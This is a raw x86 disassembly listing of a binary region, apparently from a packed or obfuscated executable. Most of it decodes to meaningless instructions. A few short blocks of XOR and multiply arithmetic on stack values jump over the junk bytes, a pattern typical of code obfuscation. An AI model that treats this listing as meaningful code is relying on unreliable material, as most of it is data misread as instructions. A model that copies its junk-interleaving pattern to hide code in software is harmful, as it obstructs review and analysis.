  40c858:	mov    BYTE PTR [ebp+0x6bad103b],ah
  40c85e:	and    DWORD PTR [ebp-0x3a],eax
  40c861:	ins    BYTE PTR es:[edi],dx
  40c862:	and    al,0xf8
  40c864:	xlat   BYTE PTR gs:[ebx]
  40c866:	retf   0xec04
  40c869:	push   esi
  40c86a:	shl    DWORD PTR [ebp+0x2d],1
  40c86d:	sub    DWORD PTR [edx+ecx*2],esi
  40c870:	xor    ebp,edi
  40c872:	mov    ecx,0x78552b5e
  40c877:	cmp    DWORD PTR ds:0xcf469f7,ebp
  40c87d:	lea    ebp,fs:[edi+0x60]
  40c881:	stos   BYTE PTR es:[edi],al
  40c882:	fwait
  40c883:	add    ecx,ebp
  40c885:	push   esi
  40c886:	pop    eax
  40c887:	mov    cl,0x30
  40c889:	xchg   ebp,eax
  40c88a:	out    dx,eax
  40c88b:	push   0xffffff8d
  40c88d:	loope  0x40c833
  40c88f:	in     eax,0x67
  40c891:	lock jl 0x40c8f2
  40c894:	cdq    
  40c895:	rcl    DWORD PTR [edx+0x4e],1
  40c898:	xchg   esi,eax
  40c899:	push   es
  40c89a:	add    BYTE PTR [edx-0x73e4e937],ch
  40c8a0:	imul   esp,ebp,0x64
  40c8a3:	daa    
  40c8a4:	(bad)
  40c8a8:	mov    eax,ds:0xa227928a
  40c8ad:	xchg   ebp,eax
  40c8ae:	xor    bh,bh
  40c8b0:	stc    
  40c8b1:	mov    ebx,0x99198c20
  40c8b6:	xchg   ebp,eax
  40c8b7:	jl     0x40c92f
  40c8b9:	jno    0x40c841
  40c8bb:	and    dh,BYTE PTR [eax-0x25]
  40c8be:	test   BYTE PTR [edx+0x3a3efa52],dh
  40c8c4:	cld    
  40c8c5:	repz fst QWORD PTR ds:0x9ed83a28
  40c8cc:	out    dx,eax
  40c8cd:	cmp    al,0xd0
  40c8cf:	sbb    ah,BYTE PTR [eax-0x36e665d3]
  40c8d5:	daa    
  40c8d6:	shl    BYTE PTR [esi],0x6
  40c8d9:	xchg   BYTE PTR [edx],bh
  40c8db:	add    eax,ebp
  40c8dd:	mov    ecx,0xed1bc527
  40c8e2:	sar    BYTE PTR [ebx-0x66],cl
  40c8e5:	push   ecx
  40c8e6:	and    cl,ch
  40c8e8:	or     eax,0x9038f19e
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	icebp  
  40c919:	fsubr  st(7),st
  40c91b:	cmp    ch,ah
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8d4
  40c925:	gs aas 
  40c927:	cdq    
  40c928:	xchg   edi,eax
  40c929:	mov    BYTE PTR [ebx-0x706c25ac],dh
  40c92f:	jno    0x40c929
  40c931:	pop    ds
  40c932:	jecxz  0x40c8f5
  40c934:	fcom   QWORD PTR [ecx+edi*1+0x2a]
  40c938:	or     bh,BYTE PTR [ebx+0x4c6da5e2]
  40c93e:	clc    
  40c93f:	jne    0x40c960
  40c941:	adc    eax,0x6236e16d
  40c946:	cli    
  40c947:	lods   al,BYTE PTR ds:[esi]
  40c948:	cmc    
  40c949:	fisttp DWORD PTR [esi]
  40c94b:	push   edx
  40c94c:	or     DWORD PTR [eax+0x30609868],0xad13e5e9
  40c956:	cmp    al,0xb8
  40c958:	lods   al,BYTE PTR ds:[esi]
  40c959:	addr16 sub eax,0xb53219b
  40c95f:	jb     0x40c93d
  40c961:	and    edx,DWORD PTR [edx+0x642d608f]
  40c967:	fs into 
  40c969:	and    BYTE PTR [eax*8+0x3ea8158e],dh
  40c970:	shl    BYTE PTR [ecx],0xd3
  40c973:	sbb    eax,0x23246169
  40c978:	inc    ecx
  40c979:	js     0x40c9a0
  40c97b:	sbb    BYTE PTR [eax+0xb198bd4],dl
  40c981:	and    DWORD PTR [ebx+edi*8],ebp
  40c984:	std    
  40c985:	retf   
  40c986:	(bad)  
  40c987:	and    ebp,eax
  40c989:	loope  0x40c9d7
  40c98b:	push   edx
  40c98c:	pop    ecx
  40c98d:	hlt    
  40c98e:	mov    al,ds:0x70405c0b
  40c993:	xlat   BYTE PTR ds:[ebx]
  40c994:	call   0x771a:0x200bb0d6
  40c99b:	pop    edx
  40c99c:	mov    ch,bh
  40c99e:	cmp    DWORD PTR [esi-0x1],edi
  40c9a1:	push   ds
  40c9a2:	shl    DWORD PTR [esi],1
  40c9a4:	ds (bad) 
  40c9a6:	cmc    
  40c9a7:	sbb    bh,BYTE PTR [esp+edx*8-0x64]
  40c9ab:	push   ecx
  40c9ac:	dec    edi
  40c9ad:	jne    0x40c95e
  40c9af:	adc    DWORD PTR [edi-0x47],esi
  40c9b2:	mov    al,0x44
  40c9b4:	sub    eax,0xae8f2a51
  40c9b9:	mov    dl,0xec
  40c9bb:	inc    eax
  40c9bc:	cmp    al,0x5f
  40c9be:	push   ebx
  40c9bf:	xchg   edx,eax
  40c9c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c1:	xor    bh,dl
  40c9c3:	inc    ebp
  40c9c4:	mov    ecx,0x3999002d
  40c9c9:	mov    es:0x19dc3f4b,al
  40c9cf:	rol    ebp,cl
  40c9d1:	(bad)  
  40c9d2:	stos   DWORD PTR es:[edi],eax
  40c9d3:	in     eax,dx
  40c9d4:	enter  0x6358,0x2d
  40c9d8:	xor    BYTE PTR [eax+0x39623c56],0xa6
  40c9df:	(bad)  
  40c9e0:	in     eax,dx
  40c9e1:	adc    al,0x5
  40c9e3:	dec    ebp
  40c9e4:	hlt    
  40c9e5:	add    eax,0xd7435451
  40c9ea:	jge    0x40c98f
  40c9ec:	ja     0x40c9af
  40c9ee:	jge    0x40ca23
  40c9f0:	jge    0x40c9b8
  40c9f2:	ror    BYTE PTR [eax],0x87
  40c9f5:	out    0x12,eax
  40c9f7:	in     eax,dx
  40c9f8:	lahf   
  40c9f9:	mov    dl,0x53
  40c9fb:	mov    bl,0xd5
  40c9fd:	inc    esp
  40c9fe:	jnp    0x40ca24
  40ca00:	(bad)  
  40ca01:	add    eax,DWORD PTR [ecx-0x59]
  40ca04:	mov    ebp,0xa9bf949d
  40ca09:	stos   BYTE PTR es:[edi],al
  40ca0a:	cmp    DWORD PTR [ecx-0x57],ebx
  40ca0d:	mov    edi,0x79f24cda
  40ca12:	jbe    0x40ca1b
  40ca14:	(bad)  
  40ca15:	stc    
  40ca16:	adc    DWORD PTR [ecx+ebp*1],ecx
  40ca19:	adc    BYTE PTR [edi],al
  40ca1b:	inc    eax
  40ca1c:	xchg   esp,eax
  40ca1d:	sbb    eax,0xa931781
  40ca22:	rcl    DWORD PTR [esi+0x7f],1
  40ca25:	and    al,0xc8
  40ca27:	push   ebx
  40ca28:	xlat   BYTE PTR ds:[ebx]
  40ca29:	das    
  40ca2a:	ja     0x40c9cb
  40ca2c:	jge    0x40ca0a
  40ca2e:	in     eax,0xbe
  40ca30:	push   ebx
  40ca31:	jecxz  0x40c9bd
  40ca33:	and    eax,0x5ec12054
  40ca38:	cmc    
  40ca39:	ja     0x40c9ce
  40ca3b:	sbb    edx,0x474ddd82
  40ca41:	cwde   
  40ca42:	sub    DWORD PTR [ebx],ecx
  40ca44:	frstor [edi-0x3e]
  40ca47:	popf   
  40ca48:	sar    DWORD PTR [edx+0x2a],cl
  40ca4b:	sti    
  40ca4c:	test   eax,0x64493225
  40ca51:	mov    edi,0x12fdfd12
  40ca56:	inc    edx
  40ca57:	inc    esp
  40ca58:	inc    ebx
  40ca5a:	and    esi,edi
  40ca5c:	pop    esp
  40ca5d:	pop    ebx
  40ca5e:	cmp    eax,0x749f85c7
  40ca63:	push   0xd21da31d
  40ca68:	(bad)  
  40ca69:	lahf   
  40ca6a:	lods   eax,DWORD PTR ds:[esi]
  40ca6b:	jle    0x40ca5b
  40ca6d:	mov    ah,0x92
  40ca6f:	or     eax,0x4eed6d3b
  40ca74:	aas    
  40ca75:	push   ebp
  40ca76:	das    
  40ca77:	pusha  
  40ca78:	retf   0xb581
  40ca7b:	xchg   ebx,eax
  40ca7c:	(bad)  
  40ca7d:	loop   0x40ca0e
  40ca7f:	scas   eax,DWORD PTR es:[edi]
  40ca80:	push   edx
  40ca81:	mov    eax,ds:0x44005783
  40ca86:	xchg   edi,eax
  40ca87:	jo     0x40ca31
  40ca89:	int    0x9c
  40ca8b:	push   edx
  40ca8c:	int    0x87
  40ca8e:	ja     0x40ca70
  40ca90:	sub    al,0xbe
  40ca92:	and    DWORD PTR [esi-0x14cdaa7b],edx
  40ca98:	aaa    
  40ca99:	stos   BYTE PTR es:[edi],al
  40ca9a:	popa   
  40ca9b:	jp     0x40ca35
  40ca9d:	sub    eax,0x1c6191b1
  40caa2:	mov    ebp,0x2719a7d5
  40caa7:	popf   
  40caa8:	dec    ecx
  40caa9:	xor    DWORD PTR ds:0x9c87bbf2,ecx
  40caaf:	loope  0x40cab9
  40cab1:	sbb    esp,ecx
  40cab3:	push   edx
  40cab4:	outs   dx,DWORD PTR ds:[esi]
  40cab5:	and    al,0x70
  40cab7:	es push ss
  40cab9:	int3   
  40caba:	ret    0xd62b
  40cabd:	outs   dx,DWORD PTR ds:[esi]
  40cabe:	adc    al,0xb5
  40cac0:	cmp    eax,0xc1cf3f78
  40cac5:	pop    esp
  40cac6:	jp     0x40cafb
  40cac8:	mov    ah,0x3e
  40caca:	or     eax,0x52317a58
  40cacf:	xchg   ebx,eax
  40cad0:	enter  0x306a,0x41
  40cad4:	out    dx,al
  40cad5:	rol    BYTE PTR ds:0x7a7ee5ca,0x97
  40cadc:	xor    BYTE PTR [edi-0x37],al
  40cadf:	or     BYTE PTR [eax+0x7b],cl
  40cae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae3:	add    ch,dl
  40cae5:	test   eax,0xe3faf777
  40caea:	mov    edx,0x7c7232aa
  40caef:	sbb    al,0x8a
  40caf1:	mov    BYTE PTR [esi],0x9f
  40caf4:	cmp    ah,BYTE PTR [edx+0x683e930]
  40cafa:	outs   dx,DWORD PTR ds:[esi]
  40cafb:	data16 fwait
  40cafd:	lock mov ah,0x84
  40cb00:	jo     0x40cb01
  40cb02:	dec    eax
  40cb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb04:	xchg   edi,eax
  40cb05:	add    al,0xbf
  40cb07:	add    DWORD PTR [edi],ebx
  40cb09:	sbb    BYTE PTR [edx-0x6b],bl
  40cb0c:	cdq    
  40cb0d:	bound  edi,QWORD PTR [edx+esi*8]
  40cb10:	mov    ah,0x39
  40cb12:	(bad)  
  40cb14:	sbb    DWORD PTR [eax],ebx
  40cb16:	push   DWORD PTR [eax+0x32]
  40cb19:	sub    DWORD PTR [ebx],0x8f48876f
  40cb1f:	mov    ecx,0xbd7a003b
  40cb24:	cs pop es
  40cb26:	pop    eax
  40cb27:	mov    edx,0x6e3ff524
  40cb2c:	into   
  40cb2d:	inc    edi
  40cb2e:	adc    eax,0x3c860a35
  40cb33:	mov    ebx,ds
  40cb35:	aaa    
  40cb36:	or     BYTE PTR [edx],al
  40cb38:	aad    0xbb
  40cb3a:	ficom  DWORD PTR [ebx+ecx*8+0x1]
  40cb3e:	mov    al,0xe8
  40cb40:	bswap  esp
  40cb42:	pop    eax
  40cb43:	aas    
  40cb44:	sti    
  40cb45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb46:	mov    al,ds:0x9cbdead2
  40cb4b:	push   cs
  40cb4c:	mov    DWORD PTR [ecx],edx
  40cb4e:	mov    eax,0x167c4d80
  40cb53:	test   eax,0xe12cf5ba
  40cb58:	sbb    DWORD PTR [edi],esp
  40cb5a:	retf   
  40cb5b:	scas   eax,DWORD PTR es:[edi]
  40cb5c:	mov    ds:0xe5f357fd,eax
  40cb61:	retf   0x9c39
  40cb64:	push   esi
  40cb65:	push   ss
  40cb66:	cwde   
  40cb67:	push   ecx
  40cb68:	(bad)
  40cb6b:	fsubr  QWORD PTR [eax]
  40cb6d:	mov    dl,0xe
  40cb6f:	push   ss
  40cb70:	sub    esp,DWORD PTR ds:0x8c593855
  40cb76:	inc    esp
  40cb77:	cwde   
  40cb78:	addr16 fcmove st,st(0)
  40cb7b:	push   edi
  40cb7c:	mov    eax,0xee153fad
  40cb81:	lahf   
  40cb82:	or     DWORD PTR [edx],eax
  40cb84:	xor    al,0xf9
  40cb86:	popf   
  40cb87:	lods   eax,DWORD PTR ds:[esi]
  40cb88:	mov    BYTE PTR ds:0xa6229cfd,bh
  40cb8e:	mov    DWORD PTR [edx+0x478157f0],eax
  40cb94:	inc    edi
  40cb95:	inc    BYTE PTR [eax-0x68498fe5]
  40cb9b:	je     0x40cb29
  40cb9d:	sahf   
  40cb9e:	sbb    edi,DWORD PTR [ebp-0xf19d6a9]
  40cba4:	into   
  40cba5:	lea    edi,[eax+0x76191e2]
  40cbab:	std    
  40cbac:	lock enter 0xc7a2,0x6e
  40cbb1:	dec    edx
  40cbb2:	call   0x2a58:0xe732be9b
  40cbb9:	inc    edi
  40cbba:	pop    di
  40cbbc:	xchg   ecx,eax
  40cbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbbe:	aam    0xf1
  40cbc0:	mov    bl,0xe4
  40cbc2:	adc    BYTE PTR [edi+edi*8-0xcc7a16],ch
  40cbc9:	fmul   QWORD PTR [edi*2-0x306df368]
  40cbd0:	aad    0xb9
  40cbd2:	dec    BYTE PTR [esi-0x75]
  40cbd5:	adc    BYTE PTR [bx+0xc],dl
  40cbd9:	xchg   edi,eax
  40cbda:	outs   dx,BYTE PTR ds:[esi]
  40cbdc:	dec    ebp
  40cbdd:	mov    BYTE PTR ds:0xa66a4fe6,ch
  40cbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbe4:	out    dx,al
  40cbe5:	xchg   DWORD PTR [ebp+0x3efee9c4],ebp
  40cbeb:	and    esi,DWORD PTR [esi+0x6c0eed11]
  40cbf1:	ss jmp 0x8f90:0x38cb3ea3
  40cbf9:	inc    edi
  40cbfa:	ds cwde 
  40cbfc:	scas   al,BYTE PTR es:[edi]
  40cbfd:	fs repz test eax,0x6791f030
  40cc04:	bound  edx,QWORD PTR ds:0x446f4468
  40cc0a:	sbb    al,0x5d
  40cc0c:	into   
  40cc0d:	jp     0x40cb92
  40cc0f:	cmp    eax,0x16bff9c3
  40cc14:	loope  0x40cc88
  40cc16:	out    0x7,al
  40cc18:	retf   0x9c9f
  40cc1b:	xor    eax,ecx
  40cc1d:	rcl    BYTE PTR [esi],0xfa
  40cc20:	call   0x68caaaac
  40cc25:	adc    al,0x63
  40cc27:	ja     0x40cbd0
  40cc29:	inc    ebx
  40cc2a:	and    dh,BYTE PTR [edi-0xb9ffa6e]
  40cc30:	aas    
  40cc31:	into   
  40cc32:	cdq    
  40cc33:	test   BYTE PTR [ecx],bh
  40cc35:	mov    ss,WORD PTR [edi+ebp*1+0x3d]
  40cc39:	ret    
  40cc3a:	push   ebx
  40cc3b:	cmp    BYTE PTR [ebx-0x5e],bl
  40cc3e:	cs out 0x8a,eax
  40cc41:	dec    edi
  40cc42:	retf   0xfda5
  40cc45:	in     eax,0x3e
  40cc47:	sbb    bl,BYTE PTR [ebp+0x10940b66]
  40cc4d:	(bad)  
  40cc4e:	(bad)  
  40cc4f:	mov    eax,ds:0x7d0a0d39
  40cc54:	push   esi
  40cc55:	pop    eax
  40cc56:	jnp    0x40cc16
  40cc58:	std    
  40cc59:	ins    DWORD PTR es:[edi],dx
  40cc5a:	mov    cl,0x1c
  40cc5c:	dec    esp
  40cc5d:	add    al,0x52
  40cc5f:	add    DWORD PTR [esi+eiz*4-0x60149637],esi
  40cc66:	or     eax,0x4d0a3e5e
  40cc6b:	clc    
  40cc6c:	scas   al,BYTE PTR es:[edi]
  40cc6d:	test   dh,bl
  40cc6f:	out    dx,eax
  40cc70:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40cc72:	push   ds
  40cc73:	stos   BYTE PTR es:[edi],al
  40cc74:	fist   WORD PTR [eax]
  40cc76:	fisttp WORD PTR [esp+ecx*4]
  40cc79:	test   bl,al
  40cc7b:	stos   DWORD PTR es:[edi],eax
  40cc7c:	sbb    al,BYTE PTR [edi+0x7]
  40cc7f:	dec    esp
  40cc80:	sub    DWORD PTR [esi-0x2a],ecx
  40cc83:	adc    DWORD PTR [edx-0xb],0x6b
  40cc87:	jno    0x40cc63
  40cc89:	push   edi
  40cc8a:	arpl   WORD PTR [ebp+0x3da0a0f3],di
  40cc90:	add    BYTE PTR [ebp+esi*4+0x73],0xfe
  40cc95:	je     0x40ccf6
  40cc97:	sub    eax,0x68c2b030
  40cc9c:	dec    ebp
  40cc9d:	addr16 pop ebx
  40cc9f:	(bad)  [eax-0x6f117b1b]
  40cca5:	cld    
  40cca6:	mov    esi,0xbc9e9b4c
  40ccab:	es popa 
  40ccad:	out    dx,al
  40ccae:	or     dh,BYTE PTR [ecx+0x4c]
  40ccb1:	aad    0x8b
  40ccb3:	xchg   ebp,eax
  40ccb4:	ret    
  40ccb5:	enter  0x5747,0xd
  40ccb9:	jns    0x40cccd
  40ccbb:	push   ebx
  40ccbc:	and    al,0xd4
  40ccbe:	or     eax,0x206ad3a2
  40ccc3:	cwde   
  40ccc4:	inc    ecx
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	adc    DWORD PTR [esi],0x4f
  40cd18:	add    eax,0x70900b79
  40cd1d:	jo     0x40ccbe
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd6d
  40cd23:	adc    eax,0xf5a7d3fc
  40cd28:	jmp    0xc75b:0x3248e7a8
  40cd2f:	xchg   esi,eax
  40cd30:	pusha  
  40cd31:	dec    esp
  40cd32:	or     BYTE PTR [ecx-0x29eb7bf0],bh
  40cd38:	mov    DWORD PTR [ecx+0x31],ebp
  40cd3b:	xchg   edx,edx
  40cd3d:	fidivr DWORD PTR [ecx]
  40cd3f:	arpl   bx,cx
  40cd41:	mov    BYTE PTR [esi-0x41],cl
  40cd44:	std    
  40cd45:	dec    esi
  40cd46:	adc    BYTE PTR [edi+0x39d40c86],cl
  40cd4c:	pop    es
  40cd4d:	and    ebp,edx
  40cd4f:	pop    ds
  40cd50:	inc    esi
  40cd51:	or     cl,BYTE PTR [esi-0x329d0f64]
  40cd57:	repz (bad) 
  40cd59:	(bad)  
  40cd5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5b:	mov    esi,0x4a83d73
  40cd60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd61:	jecxz  0x40cd44
  40cd63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd64:	scas   eax,DWORD PTR es:[edi]
  40cd65:	sbb    eax,0xf9bb2a31
  40cd6a:	in     eax,dx
  40cd6b:	inc    ebx
  40cd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd6d:	(bad)  
  40cd6e:	mov    esp,edi
  40cd70:	add    DWORD PTR [esi-0x18],0xfffffff7
  40cd74:	in     al,0x1e
  40cd76:	mov    al,0x5
  40cd78:	sub    DWORD PTR [esi],ebp
  40cd7a:	(bad)  
  40cd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd7d:	outs   dx,BYTE PTR ds:[esi]
  40cd7e:	call   0x6ba9:0x4b18ed24
  40cd85:	jmp    0x3e591be0
  40cd8a:	pop    edx
  40cd8b:	out    dx,al
  40cd8c:	cmp    eax,0x61bd0428
  40cd91:	aas    
  40cd92:	stos   BYTE PTR es:[edi],al
  40cd93:	adc    ecx,DWORD PTR [edi]
  40cd95:	imul   ebx,DWORD PTR [ebx+0x7e1118f],0xbce02b20
  40cd9f:	ins    DWORD PTR es:[edi],dx
  40cda0:	and    eax,0xeaa6d366
  40cda5:	(bad)  
  40cda6:	jge    0x40cd2a
  40cda8:	das    
  40cda9:	sub    eax,0x27b48fcb
  40cdae:	lahf   
  40cdaf:	(bad)  
  40cdb0:	mov    DWORD PTR [eax],edx
  40cdb2:	fucomi st,st(6)
  40cdb4:	or     DWORD PTR [ecx+0x43],ebx
  40cdb7:	mov    ebx,ebp
  40cdb9:	push   0x1b
  40cdbb:	and    BYTE PTR [esi+0x30],ch
  40cdbe:	xor    al,0xe1
  40cdc0:	outs   dx,BYTE PTR ds:[esi]
  40cdc1:	pop    edx
  40cdc2:	push   ds
  40cdc3:	sub    al,bh
  40cdc5:	fdivr  st,st(0)
  40cdc7:	or     BYTE PTR [edi],bl
  40cdc9:	xor    eax,0x70755a5a
  40cdce:	pushf  
  40cdcf:	jo     0x40ce3a
  40cdd1:	pop    esp
  40cdd2:	shl    DWORD PTR [ecx-0x5cc4209e],cl
  40cdd8:	mov    ds:0x9e3c39a,eax
  40cddd:	test   eax,0xb457d123
  40cde2:	jb     0x40cd6d
  40cde4:	fisubr DWORD PTR [eax]
  40cde6:	je     0x40cda8
  40cde8:	ds or  eax,0x987723c7
  40cdee:	adc    cl,BYTE PTR [ebp-0x3e]
  40cdf1:	pop    ebp
  40cdf2:	add    bh,al
  40cdf4:	retf   
  40cdf5:	inc    esp
  40cdf6:	xor    esp,DWORD PTR [ebx+0x72e9f080]
  40cdfc:	add    dl,al
  40cdfe:	push   eax
  40cdff:	lods   al,BYTE PTR ds:[esi]
  40ce00:	fs pop esp
  40ce02:	add    eax,0xbe40348e
  40ce07:	dec    edi
  40ce08:	pop    es
  40ce09:	dec    esp
  40ce0a:	pop    esi
  40ce0b:	jno    0x40cdc1
  40ce0d:	sahf   
  40ce0e:	mov    ecx,0xd103276a
  40ce13:	leave  
  40ce14:	(bad)  
  40ce15:	in     eax,dx
  40ce16:	jge    0x40cd9c
  40ce18:	dec    edi
  40ce19:	add    eax,0xb6ca7869
  40ce1e:	adc    ah,BYTE PTR [esp+ebp*8-0x73]
  40ce22:	sbb    al,0xe8
  40ce24:	repnz mov ch,0x24
  40ce27:	gs xchg edi,eax
  40ce29:	cs push cs
  40ce2b:	mov    ch,BYTE PTR [edi+0x53]
  40ce2e:	bound  ebx,QWORD PTR [edx+edx*1-0x43]
  40ce32:	hlt    
  40ce33:	call   0xdd64:0x6e058b24
  40ce3a:	(bad)  
  40ce3b:	out    0x2c,eax
  40ce3d:	loopne 0x40ce38
  40ce3f:	int    0x6
  40ce41:	push   edx
  40ce42:	xor    al,0xd9
  40ce44:	xchg   ebx,edx
  40ce46:	or     DWORD PTR [ecx-0x33927377],edx
  40ce4c:	mov    DWORD PTR [edi],ebp
  40ce4e:	jno    0x40ce0a
  40ce50:	inc    BYTE PTR [esi]
  40ce52:	ror    esp,cl
  40ce54:	cmp    eax,0x85379a2
  40ce59:	fstp   st(4)
  40ce5b:	mov    ebp,0x3aa695c7
  40ce60:	adc    dl,BYTE PTR [edi-0x2828735]
  40ce66:	into   
  40ce67:	imul   ebp,DWORD PTR [ebx+0x2d],0x6057e236
  40ce6e:	scas   eax,DWORD PTR es:[edi]
  40ce6f:	rcl    ah,0x38
  40ce72:	test   al,0x63
  40ce74:	add    al,0x88
  40ce76:	and    bh,BYTE PTR [edx]
  40ce78:	xor    bl,BYTE PTR [edi]
  40ce7a:	mov    edi,0x4aa79129
  40ce7f:	clc    
  40ce80:	adc    BYTE PTR [ecx-0x3c73effd],ah
  40ce86:	push   ss
  40ce87:	pop    edi
  40ce88:	mov    eax,0x86d2fffc
  40ce8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce8e:	push   edx
  40ce8f:	sbb    al,0x88
  40ce91:	pushf  
  40ce92:	js     0x40ce5c
  40ce94:	das    
  40ce95:	cld    
  40ce96:	pushf  
  40ce97:	loopne 0x40ced9
  40ce99:	ret    
  40ce9a:	out    0x3c,eax
  40ce9c:	mov    dh,0xfd
  40ce9e:	mov    edx,0xb782f499
  40cea3:	test   al,0x3c
  40cea5:	mov    ch,0xb4
  40cea7:	pop    esi
  40cea8:	and    eax,0xcf3a8e2
  40cead:	adc    bh,BYTE PTR [edx]
  40ceaf:	loop   0x40cf1a
  40ceb1:	and    ch,bl
  40ceb3:	fwait
  40ceb4:	lods   eax,DWORD PTR ds:[esi]
  40ceb5:	(bad)  
  40ceb6:	iret   
  40ceb7:	dec    esp
  40ceb8:	sahf   
  40ceb9:	mov    dl,0x91
  40cebb:	pushf  
  40cebc:	sub    eax,0x4ad44e1b
  40cec1:	pushf  
  40cec2:	imul   edx,DWORD PTR [eax],0xffffff8c
  40cec5:	call   0x481fa1ee
  40ceca:	pop    ebp
  40cecb:	addr16 js 0x40cf45
  40cece:	loope  0x40ce5f
  40ced0:	inc    eax
  40ced1:	mov    bl,0x42
  40ced3:	jecxz  0x40ce6f
  40ced5:	cmp    eax,0x593429b2
  40ceda:	aam    0x0
  40cedc:	shl    BYTE PTR [ebp*2+0x78a7398b],0x21
  40cee4:	out    dx,al
  40cee5:	xor    edx,edi
  40cee7:	jno    0x40cebf
  40cee9:	test   BYTE PTR [ecx],ch
  40ceeb:	sbb    edx,DWORD PTR [esi-0x17]
  40ceee:	mov    dh,BYTE PTR [esp+ebx*4]
  40cef1:	test   eax,0xca8aff26
  40cef6:	and    DWORD PTR [edx],eax
  40cef8:	xlat   BYTE PTR ds:[ebx]
  40cef9:	out    0x4f,eax
  40cefb:	inc    esp
  40cefc:	sbb    BYTE PTR [ecx],0xc1
  40ceff:	pop    edx
  40cf00:	dec    esi
  40cf01:	nop
  40cf02:	add    eax,0xffffff84
  40cf05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf06:	idiv   BYTE PTR cs:[esi]
  40cf09:	jno    0x40cf78
  40cf0b:	imul   edx,DWORD PTR [esi],0x2f0ea6e4
  40cf11:	in     eax,dx
  40cf12:	int    0x17
  40cf14:	xor    al,0xf3
  40cf16:	imul   ebx,DWORD PTR es:[eax-0x24ff712e],0xd478b0de
  40cf21:	dec    edi
  40cf22:	ja     0x40cf90
  40cf24:	inc    eax
  40cf25:	and    eax,0xecd3f7bc
  40cf2a:	leave  
  40cf2b:	iret   
  40cf2c:	fist   WORD PTR [ebx-0x6]
  40cf2f:	adc    eax,DWORD PTR [ecx-0x80]
  40cf32:	mov    cl,0xa
  40cf34:	addr16 (bad) 
  40cf36:	or     al,0xd7
  40cf38:	lea    ecx,[edi-0x12566907]
  40cf3e:	repnz outs dx,BYTE PTR ds:[esi]
  40cf40:	add    ebp,0x5f8271f7
  40cf46:	pop    ss
  40cf47:	mov    BYTE PTR [ebp+0x10],al
  40cf4a:	test   al,0x20
  40cf4c:	dec    ebx
  40cf4d:	adc    eax,0x4d4de2a1
  40cf52:	repz xor ebp,DWORD PTR [eax+0x45cb4932]
  40cf59:	mov    ?,WORD PTR [edx+0x26]
  40cf5c:	cs jle 0x40cf33
  40cf5f:	and    BYTE PTR [esi],ah
  40cf61:	jle    0x40cf1a
  40cf63:	pusha  
  40cf64:	inc    eax
  40cf65:	inc    ebx
  40cf66:	outs   dx,DWORD PTR ds:[esi]
  40cf67:	sbb    eax,0x92d86eb0
  40cf6c:	mov    edx,ecx
  40cf6e:	aaa    
  40cf6f:	cmp    al,0x2f
  40cf71:	stos   BYTE PTR es:[edi],al
  40cf72:	aad    0x6a
  40cf74:	fnstcw WORD PTR [esi+ebp*1+0x60]
  40cf78:	lea    ebx,[eax+0x59]
  40cf7b:	hlt    
  40cf7c:	jp     0x40cf77
  40cf7e:	cli    
  40cf7f:	push   0x32bf82b3
  40cf84:	xchg   edi,eax
  40cf85:	cld    
  40cf86:	push   ebp
  40cf87:	inc    ebx
  40cf88:	retf   0x3a06
  40cf8b:	idiv   BYTE PTR [edi+0x77]
  40cf8e:	ficomp DWORD PTR [ebx]
  40cf90:	aad    0x7
  40cf92:	mov    ecx,0xb39b0a2d
  40cf97:	pop    edi
  40cf98:	sbb    esi,DWORD PTR [ebx*8-0x3ae5d37b]
  40cf9f:	ud1    edx,edi
